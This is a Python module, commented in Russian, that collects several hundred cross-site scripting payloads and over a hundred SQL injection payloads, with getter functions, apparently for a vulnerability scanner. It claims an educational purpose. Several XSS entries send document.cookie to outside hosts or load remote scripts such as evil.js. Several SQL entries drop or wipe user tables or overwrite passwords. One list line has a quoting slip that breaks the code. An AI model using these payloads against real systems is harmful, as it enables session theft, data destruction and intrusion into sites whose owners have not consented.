"""
XSS Payload коллекция для тестирования уязвимостей
Используется только в образовательных целях на собственных ресурсах
"""

XSS_PAYLOADS = [
    # Базовые XSS payloads
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    
    # HTML события
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<iframe onload=alert(1)>',
    '<object data=x onerror=alert(1)>',
    '<embed src=x onerror=alert(1)>',
    
    # Data URI XSS
    '<a href="javascript:alert(1)">click</a>',
    '<a href="vbscript:alert(1)">click</a>',
    
    # SVG XSS
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    
    # Закодированные варианты
    '<img src=x &#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>',
    '<img src=x &#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
    
    # Форматы с пробелами и табуляциями
    '<script    >alert(1)</script>',
    '<img    src=x    onerror=alert(1)>',
    '<svg\nonload=alert(1)>',
    
    # Протокол javascript
    'javascript:alert(1)',
    'JAVASCRIPT:alert(1)',
    'jAvAsCrIpT:alert(1)',
    
    # Комбинированные
    '<img src=x onerror="alert(\'XSS\')">',
    '<img src=x onerror=\'alert("XSS")\'>',
    '<svg><img src=x onerror=alert(1)></svg>',
    
    # Event handler обфускация
    '<img src=x on&#x65;rror=alert(1)>',
    '<img src=x &#111;nerror=alert(1)>',
    
    # Form payload
    '<form action=javascript:alert(1)><input type=submit>',
    
    # Meta refresh
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    
    # Style с выражениями
    '<style>body{background:url("javascript:alert(1)")}</style>',
    
    # Base64 кодированные
    '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
    
    # Unicode escape
    '<img src=x \\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072=alert(1)>',
    
    # Null byte injection
    '<img src=x onerror=alert(1)%00.jpg>',
    
    # Case variation
    '<IMG SRC=x OnErRoR=alert(1)>',
    '<Img Src=x OnError=alert(1)>',
    
    # Множественные события
    '<img src=x onerror=alert(1) onload=alert(2)>',
    
    # Аттрибут с кавычками и без
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<img src=\'x\' onerror=\'alert(1)\'>',
    
    # Тег button
    '<button onclick=alert(1)>Click</button>',
    '<button onfocus=alert(1) autofocus>',
    
    # Label и другие интерактивные элементы
    '<label onclick=alert(1)>Click</label>',
    '<div onclick=alert(1)>Click</div>',
    '<span onclick=alert(1)>Click</span>',
    
    # Закрытие тега и переполнение аттрибута
    '<img src=x onerror=alert(1)" ">',
    '<img src=x onerror=alert(1)\' \'>',
    
    # XML Entity
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "javascript:alert(1)">]><foo>&xxe;</foo>',
    
    # Math и other tags
    '<math><mi xlink:href="javascript:alert(1)">X</mi></math>',
    
    # Polyglot XSS
    '"><svg onload=alert(1)>',
    '\';alert(1);//',
    '\");alert(1);//',
    
    # Специальные браузер-специфичные
    '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="allowNetworking" value="all"/><param name="allowScriptAccess" value="always"/><param name="movie" value="javascript:alert(1)"/></object>',
    
    # Uncommon tags
    '<track onload=alert(1)>',
    '<source onerror=alert(1)>',
    '<portal onload=alert(1)>',
    
    # Дополнительные advanced payloads
    '<a onclick="alert(omurugur);"/>',
    '"><img src=x onerror=prompt(/omur/)>',
    '");\\</script><script>alert(1)</script>"',
    '"><aUdIo SrC=x OnErRoR=alert(71465)>\';"',
    '"><svg/onload;=alert(1)>',
    '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    '<IMG SRC="jav\\tascript:alert(\'XSS\');">',
    '"><img src=x onerror=alert(document.domain)>',
    '<form action="javascript:alert(document.domain)"><button>Click</button></form>',
    '"/><script>alert(1)</script>',
    '//x:1/:///%01javascript:alert(document.cookie)/',
    '<a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>',
    '<script>document.location="http://www.attacker.com/xss?c="+document.cookie</script>',
    '%0aalert(1);/"><script>///',
    '"><iframe src="/tests/cors/%23/tests/auditor.php?q1=<img/src=x onerror=alert(1)">',
    '*//"><script>/*alert(1)//',
    '"onmouseover="prompt(1)"bad="">',
    '--></sCrIpT><sCrIpT>alert(1234)</sCrIpT>',
    '"><script src=https://x.com></script>',
    '/<svg%20onload=alert(eval(\'document\'+unescape(unescape("%252e"))%2b\'domain\'))>',
    'test\'"()&%<acx><ScRiPt >prompt(1)</ScRiPt>',
    '"()&%<ScRiPt >prompt(/XSS/)</ScRiPt>',
    '1"sTYLe="acu:Expre/**/SSion(prompt(1))"bad="">',
    '\'><img/src=""onerror="alert(atob(/PDMgVHJlbGxv/.source))'>
    '\' OR \'1\'=\'1\' #',
    '<svG onLoad=prompt(1)>',
    '?29ced"><script>alert(1)</script>9d013=1',
    '"><img+src=1+onerror=alert(\'hacı\')>&action=edit&comment=123\\"">',
    '</script><script type=text/javascript>alert(123)</script>',
    '<link href="javascript:alert(1)" rel="next">',
    '<?xml version="1.0"?><html:html xmlns:html="http://www.w3.org/1999/xhtml"><html:script>alert(document.cookie);</html:script></html:html>',
    '<a%20href="java%1B%28Jscript:alert%281%29">',
    '<video src=1 onerror=alert(1)>',
    '<audio src=1 onerror=alert(1)>',
    '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
    '<svg%20xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle%20r=100%20/><animate%20attributeName="xlink:href"%20values=";javascript:alert(1)"%20begin="0s"%20dur="0.1s"%20fill="freeze"/>',
    '<a[\\x0b]onmouseover=location="\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B">',
    'eval("aler"+(!![]+[])[+[]])("xss")',
    'this["document"]["cookie"]',
    'window[(+{}+[])[+!![]]+(![] +[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]',
    'this[\'ale\'+(!![]+[])[-~[]]+(!![]+[])[+[]]]()' ,
    'document[\'\\x63\\x6f\\x6f\\x6b\\x69\\x65\']',
    '"><img src=1 onerror=alert(String.fromCharCode(88,83,83))>',
    '<img src=/ onerror=alert(1)>',
    '<img/src/onerror=alert(1)>',
    '"+style="behavior:url(http://www.biznet.com.tr/xss.htc)"',
    '<img src=1 onerror=innerHTML=location.hash>',
    '<img src=sa onerror=eval(document.location.hash.substr(1))>',
    '<script>alert(\'httpOnly Test: \'+document.cookie)</script>',
    '<img/src="x"/onerror="alert(1)"/>',
    '></iframe><img/src="x"/onerror="alert(1)"/><"',
    '"+style="bahaviour:expression(function{}{alert(\'xxs\')}(this)}"',
    '" type="image" src="dontcare.jpg" onerror="alert(123)"',
    '"%26%26"javascript:alert%25281%2529//',
    '%A2%BE%BCscript%BEalert(%A2XSS%A2)%BC/script%BE',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
    '0;url=javascript:alert(1)" http-equiv="refresh" "',
    '<!</textarea <body onload="alert(1)">',
    '<img/src="mars.png"alt="mars">',
    '<object data="javascript:alert(0)">',
    '<object><param name="src" value="javascript:alert(0)"></param></object>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<isindex action=javascript:alert(1) type=image>',
    '<img src=x:alert(alt) onerror=eval(src) alt=0>',
    '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(\'xss\');</x:script>',
    '";location=location.hash)//#0={};alert(0)',
    'alert(document.cookie)',
    'alert(document["cookie"])',
    'with(document)alert(cookie)',
    '</a onmousemove="alert(1)">',
    '";document.write(\'<img sr\'+\'c=http://www.site.com/xss?\'+document["cookie"]+\'>\');"',
    '<script x>alert(1)</script>/',
    '\'});%0aalert(1);%20//',
    '<script>String.fromCharCode(107, 51, 110, 122, 48)</script>',
    '"+onmouseover="window.location=\'http://www.biznet.com.tr\'',
    '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%69%20%61%6D%20%68%65%72%65%27%29%3C%2F%73%63%72%69%70%74%3E',
    '<ScriPt>ALeRt("i am here")</scriPt>',
    '%00<script>alert(\'XSS\')</script>',
    '?>"<script>alert(90889)</script>',
    '%22%20onmouseover%3dalert(String.fromCharCode(88,83,83))%20par%3d%22',
    '%3Cbody%20onload=alert(document.cookie)%3E',
    '%3ciMg+SrC%3dx+OnErRoR%3dalert(51336)%3e',
    '<img%20src%3da%20onerror%3dalert(1)>',
    '">alert(String.fromCharCode(88,83,83));',
    '" onmouseover=alert(23)',
    '"+onkeypress="alert(23)"+"',
    '"+onmouseover="alert(1)"+"',
    '111"+onmouseover=alert(11123);',
    '\'onfocus="alert(0x000381)"\'',
    '<svG onLoad=prompt(1)>',
    '"><SCRIPT SRC="http://www.biznet.com.tr/turkcell_xss.jpg"></SCRIPT>',
    '<script>alert(\'XSS\')</script>',
    '"><script>alert(\'XSS\')</script>',
    '"/><script>alert(\'XSS\')</script>',
    '\'><script>alert(\'XSS\')</script>',
    '>"\'><script>alert(\'XSS\')</script>',
    '/><script>alert(\'XSS\')</script>',
    '\';}</script><script>alert(\'XSS\')</script>',
    '%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E',
    '%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E',
    '%3E%22%27%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E',
    '%2F%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E',
    '%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
    '%u0022%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
    '%u003e%u0022%u0027%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0058%u0053%u0053%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
    '%u002f%u003e%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u0027%u0048%u0065%u006c%u006c%u006f%u0027%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
    '%0027%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e',
    '%0022%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e',
    '%003e%0022%0027%003e%003cscript%003ealert%0028%0027XSS%0027%0029%003c%002fscript%003e',
    '%002f%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e',
    '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
    '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
    '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<BASE HREF="javascript:alert(\'XSS\');//">',
    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
    '<BGSOUND SRC="javascript:alert(\'XSS\');">',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<IMG DYNSRC="javascript:alert(\'XSS\')">',
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')")}</STYLE>',
    '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
    '<IMG SRC="livescript:[code]">',
    '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    '<iframe src="javascript:alert(\'XSS\');"></iframe>',
    '<embed src="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></embed>',
    '<form action="javascript:alert(\'XSS\')"><input type=submit></form>',
    '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>',
    '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
    '<IMG SRC="javascript:alert(\'XSS\')"',
    '<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>',
    '<html><head><title>XSS</title></head><body onload="alert(\'XSS\')"></body></html>',
    'oncontextmenu=prompt(document.cookie)',
    '"><input>javascript:alert(document.cookie);>',
    '"><img src=1 onerror=alert(document.cookie);>',
    '"><IMG SRC=JaVaScRiPt:alert(document.cookie)>',
    '"><IMG SRC="jav\\tascript:alert(document.cookie);">',
    '"><IMG SRC="jav&#x09;ascript:alert(document.cookie);">',
    '\\";alert(document.cookie);//',
    '"></TITLE><SCRIPT>alert(document.cookie);</SCRIPT>',
    '"><script>alert(document.cookie)</script>',
    '"><h1>',
    '"><tetxarea></script><img src=1 onerror=alert(document.cookie);>',
    '</script>">\'>\\<script>prompt(String.fromCharCode(88.83.83))</script>',
    '"><option><\"button>img src=x onerror=alert(/xss/);></button></option>',
    '</title><script>alert(/xss/)</script>',
    '\'"><script>alert(document.domain)</script>',
    '"><iframe onclick=alert(Evan)></iframe>',
    '</textarea><\"script>prompt(Evan)</script>',
    '//>\'"><img src=x onerror=prompt(Evan);>',
    '"><img src=x onerror=prompt(1)>.asd.asd',
    '\'"()&%1<ScRiPt >prompt(963191)</ScRiPt>',
    '\'"--></style></script><script>alert(/xss/)</script>',
    '"><img src=x.png onerror=prompt("XSS");>',
    '"><img src=x onerror=prompt(1);>',
    '<img src=x onerror=alert(0)>',
    '"><script>prompt(1)</script>',
    '"/><script>alert(document.cookie);</script>',
    '"><IMG SRC=# onmouseover="alert(\'xss\')"',
    '<svg onload="prompt(/xss by evan/);">',
    '<IMG SRC="jalert(\'XSS\');">',
    '<IMG SRC=jalert(\'XSS\')>',
    'false,false,false);});alert(1); //',
    '</title><!-- --><body onload=alert(1);></iframe src=http://google.com>-->',
    '\'\"onmouseover=\"prompt(1)\"',
    '<script>alert(1);</script>',
    '<script>prompt(1);</script>',
    '<script>confirm (/xss by evan/);</script>',
    '<script src="http://rhainfosec.com/evil.js">',
    '<scRiPt>alert(1);</scrIPt>',
    '<scr<script>ipt>alert(1)</scr<script>ipt>',
    '<a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>',
    '<body/onhashchange=alert(1)><a href=#>clickit',
    '<img/src=aaa.jpg onerror=prompt(1);>',
    '<video src=x onerror=prompt(1);>',
    '<audio src=x onerror=prompt(1);>',
    '<iframesrc="javascript:alert(2)">',
    '<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
    '<embed/src=//goo.gl/nlX0P>',
    '<form action="Javascript:alert(1)"><input type=submit>',
    '<isindex action="javascript:alert(1)" type=image>',
    '<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>',
    '<isindex action=data:text/html, type=image>',
    '<formaction="data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt"><button>CLICK',
    '<isindexformaction="javascript:alert(1)" type=image>',
    '<input type="image" formaction=JaVaScript:alert(0)>',
    '<form><button formaction=javascript&colon;alert(/xssbyevan/)>CLICKME',
    '<object/data=//goo.gl/nlX0P?',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">',
    '<applet code="javascript:confirm(document.cookie);">',
    '<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>',
    '<svg/onload=prompt(1);>',
    '<marquee/onstart=confirm(2)>/',
    '<body onload=prompt(1);>',
    '<select autofocus onfocus=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<keygen autofocus onfocus=alert(1)>',
    '<video><source onerror="javascript:alert(1)">',
    '<q/oncut=alert(1)>',
    '<q/oncut=open()>',
    '<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)>',
    '<a onmouseover="javascript:window.onerror=alert;throw 1>',
    '<img src=x onerror="javascript:window.onerror=alert;throw 1">',
    '<a onmouseover=location="javascript:alert(1)>click',
    '<body onfocus="location="javascrpt:alert(1) >123',
    '<svg><script>alert&#40/1/&#41</script>',
    '<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
    '<math><a xlink:href="//jsfiddle.net/t846h/">click',
    '<svg><![CDATA[><imagexlink:href="]]><img/src=xx:xonerror=alert(2)//"></svg>',
    '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a><circle r=100 /><animate attributeName="xlink:href" values=";javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>',
    '<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:\\u0061lert(1);"></g></svg>',
    '<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
    '<meta http-equiv="refresh" content="0;url=//goo.gl/nlX0P">',
    '" autofocusonfocus=alert(1)//',
    '" onmouseover="prompt(0) x="',
    '" onfocusin=alert(1) autofocus x="',
    '" onfocusout=alert(1) autofocus x="',
    '" onblur=alert(1) autofocus a="',
    '";alert(1)//',
    '"/></script><svg onload="-/"/-prompt(/xss by evan/)//"',
    '"><img src=x <img src=x onerror=prompt(7)>=<img src=x onerror=prompt(7)>(1)>',
    '<img src="<img src=search"/onerror=alert("xss")//">',
    '"><h1 ondblclick=prompt(document.domain)>xss by evan</h1>',
    '\';prompt(String.fromCharCode(120,+115,+115))//\\\'',
]


# Дополнительные группы payload-ов для специфичных проверок

SQL_INJECTION_PAYLOADS = [
    # Базовые SQL инъекции
    "'",
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' OR 1=1--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin' --",
    "' OR 'x'='x",
    "' UNION ALL SELECT NULL--",
    "1'; DROP TABLE users--",
    
    # Boolean-based blind SQLi
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1 AND 'a'='a",
    "' AND 1=2 AND 'a'='a",
    "1' AND 1=1--",
    "1' AND 1=2--",
    
    # Time-based blind SQLi
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5); --",
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; BENCHMARK(5000000, UPPER('test')); --",
    
    # Union-based SQLi
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL--",
    "' UNION ALL SELECT version()--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT @@version--",
    
    # Stacked queries
    "'; DROP TABLE users; --",
    "'; DELETE FROM users; --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "'; UPDATE users SET password='hacked'; --",
    
    # MySQL специфичные
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1; %23",
    "' UNION SELECT @@version, user() --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT column_name FROM information_schema.columns --",
    
    # PostgreSQL специфичные
    "'; SELECT version(); --",
    "' UNION SELECT current_database(); --",
    "' UNION SELECT user; --",
    "' UNION SELECT * FROM pg_user; --",
    "' UNION SELECT table_name FROM information_schema.tables; --",
    
    # MSSQL специфичные
    "' EXEC sp_tables --",
    "' EXEC sp_columns @table_name='users' --",
    "' UNION SELECT @@version --",
    "' UNION SELECT DB_NAME() --",
    "' UNION SELECT CURRENT_USER --",
    
    # Oracle специфичные
    "' UNION SELECT * FROM user_tables --",
    "' UNION SELECT * FROM user_tab_columns --",
    "' UNION SELECT banner FROM v$version --",
    "' UNION SELECT username FROM all_users --",
    
    # Error-based SQLi
    "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
    "' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(@@version, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # Второй порядок (Second-order)
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin'--",
    "admin' /*",
    "admin' #",
    
    # Логические манипуляции
    "' OR '' = '",
    "' OR 1 = 1 OR '1' = '1",
    "' OR a=a --",
    "' OR a=a #",
    "' OR a=a /*",
    
    # Обход фильтров
    "' /*!50000OR*/ '1'='1",  # MySQL версионный комментарий
    "' %4F%52 '1'='1",        # OR закодирован
    "' %51%4E%49%4F%4E %53%45%4C%45%43%54",  # UNION SELECT закодирован
    
    # Нулевые байты и кодирование
    "' %00",
    "' %23",  # #
    "' %2D%2D",  # --
    
    # Конкатенация и обход
    "' un/**/ion select null--",
    "' u/**/nion u/**/nion select null--",
    "' /*!50000union*/ select null--",
    
    # Различные комментарии
    "' -- -",
    "' # ",
    "' /*",
    "' /*! */",
    "' /*!40000 */",
    
    # Escape-последовательности
    "' \\' OR '1'='1",
    "' ' OR ' '1' = '1",
    "' ESCAPE '\\' OR '1'='1",
    
    # Null байты
    "' %00 OR '1'='1",
    "' \x00 OR '1'='1",
    
    # Побег из строк
    "\") OR (\"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"\" = \"",
    
    # Множественные условия
    "' AND 1=1 UNION SELECT null--",
    "' OR 1=1 AND 'a'='a",
    "' AND (1=1 OR 1=1) --",
    
    # Инъекции в числовые поля
    "1 OR 1=1",
    "1; DROP TABLE users; --",
    "-1 UNION SELECT NULL--",
    "999999 UNION SELECT null--",
    
    # Проверка версий базы данных
    "' AND SUBSTRING(@@version, 1, 1) = '5'--",
    "' AND ASCII(SUBSTRING(@@version, 1, 1)) > 48--",
    
    # Проверка существования таблиц
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') = 1--",
    "' AND EXISTS(SELECT * FROM users)--",
]


def get_xss_payloads():
    """Возвращает список XSS payload-ов"""
    return XSS_PAYLOADS


def get_sql_payloads():
    """Возвращает список SQL injection payload-ов"""
    return SQL_INJECTION_PAYLOADS


def get_xss_payloads_count():
    """Возвращает количество XSS payload-ов"""
    return len(XSS_PAYLOADS)


def get_sql_payloads_count():
    """Возвращает количество SQL payload-ов"""
    return len(SQL_INJECTION_PAYLOADS)